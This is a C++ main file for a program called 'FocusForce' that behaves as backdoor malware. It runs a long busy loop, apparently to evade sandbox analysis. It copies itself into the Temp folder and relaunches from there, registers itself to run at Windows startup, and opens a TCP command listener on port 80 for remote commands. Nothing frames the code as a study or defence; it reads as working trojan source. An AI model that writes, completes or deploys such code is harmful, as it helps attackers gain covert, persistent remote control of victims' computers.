#include <iostream>
#include <string>
#include "CommandServer.h"
#include "AutostartMenager.h"
#include <cstdlib>

using namespace std;

void antySimulator(){
    int first=1;
    int second=1;
    int temp;
    for(int i=0;i<500000007;i++){ // 500 MLN
        temp=second;
        second+=first;
        second%=5775123;
        first=temp;
    }
    cout << second << "\n";
}

int main(int argc, char** argv) {
    AutostartMenager autostartMenager;  
    cout<<argv[0] << "\n";
    cout<<"FocusForce init...\n";
    #ifndef DEBUG
        antySimulator();
        cout<<"Autostart status: " << autostartMenager.isInStartup() << "\n";
        if(autostartMenager.isInTempFolder(string(argv[0]))==false){
            cout<<"No in Temp!\n";
            string filePath = autostartMenager.moveToTempFolder();
            string commadToRun = "start " + filePath;
            system(commadToRun.c_str());

            if(!autostartMenager.isInStartup()){
                cout << "Adding to register...\n";
                autostartMenager.addToStartup(filePath);
            }
            return 0;
        }
        cout << "in Temp!\n";
    #endif

    CommandServer c;
    c.startTCPListener(80);


    return 0;
} 